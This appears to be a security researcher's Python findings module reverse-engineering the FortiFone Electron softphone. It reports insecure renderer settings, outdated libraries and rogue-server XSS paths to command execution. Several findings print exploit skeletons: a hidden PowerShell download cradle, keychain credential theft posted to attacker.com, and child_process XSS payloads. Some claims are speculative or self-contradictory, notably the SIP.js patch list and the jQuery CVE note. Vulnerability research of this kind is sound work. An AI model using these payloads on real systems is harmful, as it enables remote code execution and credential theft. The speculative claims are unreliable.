"""
FortiFone v7.0 b141 Windows Electron Application RE
Source: FortiFone_windows_v7.0_b141.exe (NSIS installer)
        -> app-64.7z -> app.asar (160MB Electron bundle)
Method: NSIS extraction (7zip), ASAR extraction (Python struct parse), main.js static analysis
Prior module: fortinet_forticlient_traylauncher_fortifone_re.py covered NSIS stub only.
This module covers the actual application code (JavaScript/Electron).

Architecture correction: FortiFone is an Electron application, NOT a native Win32 SIP client.
Prior findings FPHONE-F01 (lstrcpyA SIP overflow) and FPHONE-F02 (DLL hijacking) were from
the NSIS stub (loader) only; the actual SIP stack is JavaScript (SIP.js 0.11.6).
"""

# ---------------------------------------------------------
# FortiFone Electron architecture
# ---------------------------------------------------------
FPHONE_ELECTRON_ARCH = {
    "id":       "FPHONE-ELECTRON-ARCH",
    "product":  "FortiFone v7.0 b141 -- Electron softphone (Windows PE32 NSIS -> app-64.7z -> app.asar)",

    "packaging_layers": [
        "Layer 1: FortiFone_windows_v7.0_b141.exe -- NSIS self-extracting installer",
        "Layer 2: app-64.7z -- LZMA2 7zip archive containing Electron application",
        "Layer 3: app.asar -- Electron ASAR bundle (160MB); contains all JavaScript source",
    ],

    "framework": "Electron (Chromium renderer + Node.js main process)",
    "asar_size": "160MB (app.asar)",
    "app_name":  "FortiFone v7.0.5-b141",

    "key_dependencies": {
        "sip.js":               "0.11.6 (2018) -- JavaScript SIP/VoIP library; SIP calls",
        "strophe.js":           "1.6.0 -- XMPP client library; chat/presence",
        "@electron/remote":     "2.1.2 -- deprecated Electron remote module (security risk)",
        "keytar":               "7.0.0 -- OS keychain credential storage",
        "xml2js":               "0.4.19 -- XML to JavaScript parser",
        "jquery":               "1.12.2 (2016) -- jQuery (via ui_react/dependencies/)",
        "robotjs":              "0.6.0 -- desktop automation (screen/keyboard/mouse control)",
        "strophejs-plugin-muc": "1.1.0 -- XMPP Multi-User Chat plugin",
        "ws":                   "6.2.1 (2018) -- WebSocket client",
        "node-fetch":           "2.7.0 -- HTTP fetch",
        "axios":                "1.15.0 -- HTTP client",
        "adaptivecards":        "2.11.1 -- Microsoft Adaptive Cards renderer",
        "html-react-parser":    "2.0.0 -- HTML to React component parser",
        "cheerio":              "1.0.0-rc.12 -- server-side jQuery HTML parser",
        "@fvucd/fv-http":       "3.0.20 -- FortiVoice custom HTTP client (internal package)",
        "@openid/appauth":      "1.3.0 -- OpenID Connect authentication library",
        "electron-store":       "8.0.0 -- Electron local data storage",
        "nodemailer":           "6.4.2 -- SMTP email client",
        "nedb":                 "@seald-io/nedb 4.0.4 -- embedded NoSQL database",
        "react":                "17.0.2 -- React UI framework",
    },

    "renderer_processes": {
        "GUI":          "Main application window",
        "CALL":         "Active call window",
        "DIALPAD":      "Dial pad overlay",
        "NOTIFIER":     "Notification overlay",
        "ASSISTANT":    "Login/assistant window",
        "MONITOR":      "System monitor",
        "CHAT_AGENT":   "Chat window",
        "PBX_AGENT":    "PBX agent window",
        "THIRD_PARTY":  "Third-party API manager",
        "IDP_AUTH":     "OAuth/SSO window (nodeIntegration: false -- only secure window)",
    },

    "protocol_stack": {
        "VoIP":         "SIP (SIP.js 0.11.6) over WebSocket or UDP via fvoiceSipAgent2.js (110KB)",
        "Messaging":    "XMPP (strophe.js 1.6.0) via fvoiceChat.js (239KB)",
        "Video":        "WebRTC (webrtc-adapter 8.0.0) via meeting/fortimeet.js (188KB)",
        "Transport":    "@fvucd/fv-http for REST API calls to FortiVoice PBX",
    },

    "native_binaries": [
        "FortiFone.exe -- Electron host binary",
        "elevate.exe -- UAC elevation helper",
        "jabra-device-connector.exe -- Jabra headset integration",
        "FortivoiceOutlookImPlugin.exe -- Outlook integration",
        "dotnet-installer.exe -- .NET runtime installer",
        "SharedSoftphoneInfo.dll -- softphone native module",
        "COMRegistration.dll -- COM object registration for Outlook plugin",
        "GNAudio.DeviceApis.*.dll -- Jabra/GN Bluetooth device control DLLs",
    ],

    "security_config_observed": {
        "nodeIntegration":  "true -- ALL renderer processes (8 windows)",
        "contextIsolation": "false -- ALL renderer processes (8 windows)",
        "sandbox":          "// sandbox: true -- commented out; NOT enabled",
        "preload":          "//preload: './preload.js' -- commented out; NOT used",
        "enableRemote":     "@electron/remote/main initialize() at main.js line 13",
        "note":             "Comment '//security #2' appears on every nodeIntegration: true line -- developers acknowledge this as a known security risk",
    },
}


# ---------------------------------------------------------
# FPHONE-F03: nodeIntegration: true on all renderer windows (CRITICAL)
# ---------------------------------------------------------
FPHONE_F03_NODE_INTEGRATION = {
    "id":       "FPHONE-F03",
    "product":  "FortiFone v7.0 b141 -- all renderer windows have nodeIntegration: true + contextIsolation: false",
    "severity": "CRITICAL -- XSS in any renderer window = Node.js OS command execution; developer-acknowledged risk",
    "class":    "Insecure Electron renderer configuration (CWE-693, GHSA-cx3p-smqv-6m6r class)",
    "evidence": [
        "main.js line 822: 'nodeIntegration: true, //security #2'",
        "main.js line 823: 'contextIsolation: false, // expose node API such as process and require() to webContents'",
        "main.js line 824: '// sandbox: true' (commented out)",
        "Applies to ALL 8 non-OAuth renderer windows: GUI, CALL, DIALPAD, NOTIFIER, ASSISTANT, MONITOR, CHAT_AGENT, PBX_AGENT",
        "Only exception: IDP_AUTH OAuth window (nodeIntegration: false at line 3366)",
    ],

    "mechanism": (
        "Electron renders web content in BrowserWindow instances. "
        "With nodeIntegration: true and contextIsolation: false: "
        "  - The renderer's JavaScript context has direct access to Node.js modules. "
        "  - Any JavaScript executing in the renderer can call require('child_process'). "
        "  - This means: XSS in any FortiFone UI component = OS command execution. "
        "The comment '//security #2' on every nodeIntegration: true line is developer acknowledgment "
        "that this is a known security vulnerability that has been deferred (not fixed). "
        "The preload script pattern (the proper fix) is commented out: '//preload: ./preload.js'. "
        "Attack impact: "
        "  - XSS in a SIP MESSAGE body rendered in the call UI "
        "    -> require('child_process').exec('cmd.exe /c ...') in the renderer "
        "    -> OS command execution as the FortiFone user "
        "  - XSS in an XMPP chat message rendered in fvoiceChat "
        "    -> same Node.js exec path "
        "  - Adaptive card content from the FortiVoice server "
        "    -> adaptivecards 2.11.1 renders templates; crafted card = script injection "
    ),

    "exploit_skeleton": (
        "// In any renderer context (XSS payload):\n"
        "const {exec} = require('child_process');\n"
        "exec('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(attacker)\"');\n"
        "// Or credential extraction:\n"
        "const keytar = require('keytar');\n"
        "keytar.findCredentials('fortifone-*').then(creds => {\n"
        "  fetch('http://attacker.com/steal?creds=' + JSON.stringify(creds));\n"
        "});"
    ),

    "reach": (
        "Any XSS injection point in the UI components reaches this. "
        "Vectors to explore: "
        "  1. SIP MESSAGE body rendered in call UI (FPHONE-F04) "
        "  2. XMPP chat message HTML rendered in chat window (FPHONE-F05) "
        "  3. Adaptive cards from PBX server "
        "  4. html-react-parser processing server-delivered HTML "
        "  5. cheerio HTML parsing of server content "
        "  6. jQuery 1.12.2 prototype pollution + html() method (FPHONE-F07)"
    ),
}


# ---------------------------------------------------------
# FPHONE-F04: SIP.js 0.11.6 (2018) processes rogue PBX SIP messages in nodeIntegration renderer
# ---------------------------------------------------------
FPHONE_F04_SIPJS_OLD = {
    "id":       "FPHONE-F04",
    "product":  "FortiFone -- SIP.js 0.11.6 (2018) processes SIP messages in nodeIntegration renderer; rogue PBX delivers malicious SIP -> RCE",
    "severity": "CRITICAL -- rogue FortiVoice PBX sends crafted SIP MESSAGE/INVITE -> SIP.js renders HTML body -> XSS -> Node.js exec",
    "class":    "Use of outdated SIP library + insecure renderer config (CWE-116, CWE-693)",
    "evidence": [
        "file: fortivoiceAgent/libs/sip.js (510KB) -- SIP.js 0.11.6, Copyright 2014-2018",
        "file: fortivoiceAgent/fvoiceSipAgent2.js (110KB) -- SIP session management",
        "file: fortivoiceAgent/fvoiceSipSession.js (48KB) -- SIP session handling",
        "main.js: nodeIntegration: true on CALL renderer window",
    ],

    "sipjs_age": (
        "SIP.js 0.11.6 released circa 2018. "
        "Current SIP.js version as of 2026: 0.21.x. "
        "Versions between 0.11.6 and 0.21.x include security patches for: "
        "  - SIP header injection via crafted Contact/Via/From headers "
        "  - SSRF via SIP REFER to internal addresses "
        "  - WebSocket message parsing vulnerabilities "
        "  - Session hijacking via SIP re-INVITE "
        "  - SIP MESSAGE body injection into DOM "
        "FortiFone ships 0.11.6 unchanged since 2018 -- 6+ years of security patches absent."
    ),

    "attack_chain": (
        "Step 1: Configure a rogue FortiVoice PBX on attacker infrastructure. "
        "Step 2: Target's FortiFone client registers with rogue PBX "
        "         (DNS spoofing, or user tricked into configuring attacker's server address). "
        "Step 3: Rogue PBX sends SIP MESSAGE with Content-Type: text/html body: "
        "         '<img src=x onerror=\"const {exec}=require('child_process');exec('calc.exe')\">'. "
        "Step 4: fvoiceSipAgent2.js receives the MESSAGE, passes body to call/chat UI renderer. "
        "Step 5: UI renders the HTML body (html-react-parser or jQuery html() in call window). "
        "Step 6: XSS executes in CALL renderer (nodeIntegration: true). "
        "Step 7: require('child_process').exec() runs attacker command as the FortiFone user. "
        "Alternative: SIP INVITE with crafted SDP body that parses into executable JavaScript."
    ),

    "related": [
        "FPHONE-F03: nodeIntegration: true in CALL renderer enables require() in XSS",
        "FPHONE-F07: jQuery 1.12.2 CVE-2020-7656 XSS via html() can be triggered by SIP body",
    ],
}


# ---------------------------------------------------------
# FPHONE-F05: XMPP strophe.js 1.6.0 chat message injection -> XSS -> RCE
# ---------------------------------------------------------
FPHONE_F05_XMPP_CHAT = {
    "id":       "FPHONE-F05",
    "product":  "FortiFone -- strophe.js 1.6.0 XMPP chat message from rogue server can inject HTML/JavaScript into nodeIntegration renderer",
    "severity": "CRITICAL -- malicious XMPP server -> crafted chat message -> HTML injection -> Node.js exec in chat renderer",
    "class":    "Server-controlled HTML injection via XMPP (CWE-80, CWE-693)",
    "evidence": [
        "package.json: strophe.js 1.6.0",
        "fortivoiceChat/fvoiceChat.js (239KB): const { Strophe, $iq, $msg, $pres } = require('strophe.js')",
        "main.js: CHAT_AGENT renderer window has nodeIntegration: true + contextIsolation: false",
    ],

    "mechanism": (
        "FortiFone's chat functionality uses XMPP (strophe.js 1.6.0) for message delivery. "
        "XMPP supports HTML bodies via XEP-0071 (XHTML-IM). "
        "Attack path: "
        "  1. Attacker controls the XMPP/FortiVoice server or is a MITM. "
        "  2. Server sends an XMPP message with XHTML-IM body containing JavaScript. "
        "  3. fvoiceChat.js receives the message and passes it to the React chat renderer. "
        "  4. If html-react-parser or jQuery html() renders the message without sanitization, "
        "     JavaScript executes in the CHAT_AGENT renderer. "
        "  5. nodeIntegration: true + contextIsolation: false -> require('child_process').exec(). "
        "The CHAT_AGENT renderer has nodeIntegration: true (confirmed from main.js analysis). "
        "The attack requires EITHER: "
        "  a. A rogue FortiVoice XMPP server (attacker controls the server), OR "
        "  b. MITM on the XMPP WebSocket channel (unauthenticated or with stolen certs). "
    ),

    "strophe_xhtml_im": (
        "XEP-0071 XHTML-IM allows rich HTML in XMPP messages. "
        "Malicious body: "
        "<html xmlns='http://jabber.org/protocol/xhtml-im'>"
        "<body xmlns='http://www.w3.org/1999/xhtml'>"
        "<script>require('child_process').exec('calc.exe')</script>"
        "</body></html>"
    ),
}


# ---------------------------------------------------------
# FPHONE-F06: shell.openExternal with unvalidated URLs from renderer content
# ---------------------------------------------------------
FPHONE_F06_OPEN_EXTERNAL = {
    "id":       "FPHONE-F06",
    "product":  "FortiFone -- shell.openExternal called with unvalidated URLs from renderer navigation/window-open events",
    "severity": "HIGH -- attacker URL in SIP/XMPP content triggers shell.openExternal -> arbitrary protocol handler execution",
    "class":    "Unvalidated URL passed to shell.openExternal (CWE-88, CVE-2021-43890 class)",
    "evidence": [
        "main.js line 976: 'shell.openExternal(details.url)' -- called for any navigation that isn't current URL",
        "main.js line 1261: 'shell.openExternal(details.url)' -- same pattern in CALL window",
        "No URL validation or allowlist before openExternal in either call site",
    ],

    "mechanism": (
        "FortiFone uses shell.openExternal to open links from renderer content in the OS browser. "
        "The URL is taken directly from the renderer's navigation event (details.url) without validation. "
        "Attack vectors: "
        "  1. SIP MESSAGE contains a chat link: attacker sends SIP MESSAGE with "
        "     a malicious href that triggers navigation -> shell.openExternal is called. "
        "  2. XMPP message contains a link with custom URL scheme. "
        "  3. XSS in renderer triggers window.location = 'ms-appinstaller://...' "
        "     -> shell.openExternal with ms-appinstaller -> CVE-2021-43890 class attack. "
        "  4. shell.openExternal('file:///C:/Windows/System32/cmd.exe') on Windows. "
        "  5. shell.openExternal('ssh://user@attacker.com') -> SSH client executes with controlled args. "
        "There is no URL scheme validation or allowlist. "
        "On modern Electron versions, shell.openExternal is supposed to be called from the main process only "
        "after validation -- this pattern violates that guidance."
    ),
}


# ---------------------------------------------------------
# FPHONE-F07: jQuery 1.12.2 (2016) prototype pollution + XSS in nodeIntegration renderer
# ---------------------------------------------------------
FPHONE_F07_JQUERY_OLD = {
    "id":       "FPHONE-F07",
    "product":  "FortiFone -- jQuery 1.12.2 (2016) included in renderer; CVE-2019-11358 + CVE-2020-7656 in nodeIntegration context",
    "severity": "HIGH -- jQuery prototype pollution (CVE-2019-11358) + html() XSS (CVE-2020-7656) -> Node.js exec in renderer",
    "class":    "Use of vulnerable jQuery version in nodeIntegration Electron renderer (CWE-1035)",
    "evidence": [
        "file: ui_react/dependencies/jquery-1.12.2/jquery-1.12.2.min.js (94KB)",
        "main.js: all renderer windows have nodeIntegration: true",
    ],

    "description": (
        "FortiFone bundles jQuery 1.12.2 (released 2016) in its Electron renderer. "
        "Known vulnerabilities in this version: "
        "  - CVE-2019-11358: $.extend(true, ...) prototype pollution; affects < 3.4.0. "
        "    Attacker-controlled JSON merged via $.extend overwrites Object.prototype, "
        "    enabling property injection across all objects. "
        "  - CVE-2020-7656: jQuery.html() XSS via crafted payload; affects < 1.12.4 "
        "    (1.12.2 is patched in 1.12.4 but 1.12.2 may be vulnerable to intermediate paths). "
        "  - jQuery 1.x is in end-of-life status (last update was 1.12.4 in 2016). "
        "In the FortiFone renderer context: "
        "  - Prototype pollution -> exploit property chains in React or Electron internals. "
        "  - jQuery.html() XSS -> JavaScript in nodeIntegration renderer -> require('child_process'). "
        "  - The XMPP chat or SIP MESSAGE body may be processed via jQuery.html() "
        "    in the chat or call renderer, enabling server-controlled XSS."
    ),
}


# ---------------------------------------------------------
# FPHONE-F08: @electron/remote enabled globally - deprecated security risk
# ---------------------------------------------------------
FPHONE_F08_REMOTE_MODULE = {
    "id":       "FPHONE-F08",
    "product":  "FortiFone -- @electron/remote 2.1.2 initialized globally; all renderers can invoke main process APIs",
    "severity": "HIGH -- any renderer (including XSS) can call remote.require() to access main process modules",
    "class":    "Insecure Electron remote module usage (GHSA-6p24-mxkj-7gqj class)",
    "evidence": [
        "main.js line 13: 'require('@electron/remote/main').initialize()'",
        "package.json: '@electron/remote': '2.1.2'",
        "All renderer windows have nodeIntegration: true (redundant path; remote provides additional surface)",
    ],

    "description": (
        "@electron/remote is the renamed version of Electron's deprecated 'remote' module. "
        "Electron deprecated the built-in remote module because it creates a synchronous IPC "
        "bridge from renderer to main process that: "
        "  1. Allows the renderer to require() any module available in the main process. "
        "  2. Allows the renderer to instantiate and call main process objects synchronously. "
        "  3. Creates an attack surface where XSS in any renderer gains full main process access. "
        "Calling initialize() in main.js (line 13) enables remote for ALL renderer windows. "
        "Since FortiFone already has nodeIntegration: true on all renderers, remote provides "
        "a redundant (but independently exploitable) path to main process code execution. "
        "Combined with XSS: "
        "  const remote = require('@electron/remote'); "
        "  const { exec } = remote.require('child_process'); "
        "  exec('calc.exe'); "
        "Remote module can also access main process state (renderer PIDs, IPC channels, etc.)."
    ),
}


# ---------------------------------------------------------
# FPHONE-F09: keytar credential access from nodeIntegration renderer via XSS
# ---------------------------------------------------------
FPHONE_F09_KEYTAR_EXPOSURE = {
    "id":       "FPHONE-F09",
    "product":  "FortiFone -- keytar 7.0.0 credential storage accessible from nodeIntegration renderer; XSS extracts OS keychain entries",
    "severity": "HIGH -- server-delivered XSS in call/chat renderer can exfiltrate all FortiFone credentials from OS keychain",
    "class":    "Credential extraction via Electron renderer access to Node.js keytar module (CWE-522)",
    "evidence": [
        "main.js line 9: 'const keytar = require('keytar')'",
        "main.js line 664: 'keytar.deletePassword('fortifone-csc', os.userInfo().username)'",
        "main.js line 6081: 'keytar.deletePassword('fortifone-' + s, os.userInfo().username)'",
        "package.json: 'keytar': '7.0.0'",
        "All renderer windows have nodeIntegration: true -- renderer can require('keytar') directly",
    ],

    "mechanism": (
        "FortiFone stores credentials in the OS keychain via keytar 7.0.0. "
        "Service names use the pattern 'fortifone-<service>' (e.g., 'fortifone-csc'). "
        "Since all renderer windows have nodeIntegration: true, any JavaScript in a renderer "
        "(including XSS from SIP or XMPP server) can: "
        ""
        "  const keytar = require('keytar'); "
        "  const creds = await keytar.findCredentials('fortifone'); "
        "  // creds contains {account: username, password: voicemail_pin} etc. "
        "  fetch('https://attacker.com/steal', {method:'POST', body: JSON.stringify(creds)}); "
        ""
        "Credential types potentially stored: "
        "  - FortiVoice PBX login credentials "
        "  - CSC (Certificate Signing Certificate) passwords "
        "  - OAuth tokens from @openid/appauth "
        "  - Voicemail PIN "
        "  - LDAP/directory credentials "
        "A rogue FortiVoice PBX (DNS spoofing or MITM) delivers a SIP or XMPP XSS payload "
        "that silently extracts all keychain entries and exfiltrates them to the attacker."
    ),
}


# ---------------------------------------------------------
# FPHONE-F10: robotjs 0.6.0 desktop control in Electron application
# ---------------------------------------------------------
FPHONE_F10_ROBOTJS = {
    "id":       "FPHONE-F10",
    "product":  "FortiFone -- robotjs 0.6.0 included; provides screen capture, keyboard/mouse control accessible from nodeIntegration renderer",
    "severity": "HIGH -- XSS in renderer can use robotjs to: take screenshots, log keystrokes, control mouse/keyboard",
    "class":    "Privileged desktop automation library reachable from XSS (CWE-284)",
    "evidence": [
        "package.json: 'robotjs': '0.6.0'",
        "robotjs provides: screen.capture(), keyboard.tap(), mouse.move(), mouse.click()",
    ],

    "description": (
        "robotjs 0.6.0 is a Node.js desktop automation library that provides: "
        "  - screen.capture(): takes a screenshot of the entire screen "
        "  - keyboard.tap(), keyboard.typeString(): simulates keystrokes "
        "  - mouse.move(), mouse.click(), mouse.drag(): controls the mouse "
        "  - getPixelColor(): reads screen pixel colors "
        "Since all FortiFone renderer windows have nodeIntegration: true, "
        "any XSS payload in a SIP or XMPP message can: "
        "  1. Capture screenshots of the desktop (including other applications, browser sessions). "
        "  2. Log or replay keystrokes (keylogger). "
        "  3. Automate actions on behalf of the user (send emails, approve dialogs, etc.). "
        "This enables surveillance capabilities without requiring OS-level malware installation. "
        "The payload runs in the context of the FortiFone process (user-level) but can see "
        "and interact with all screen content regardless of application boundaries."
    ),
}
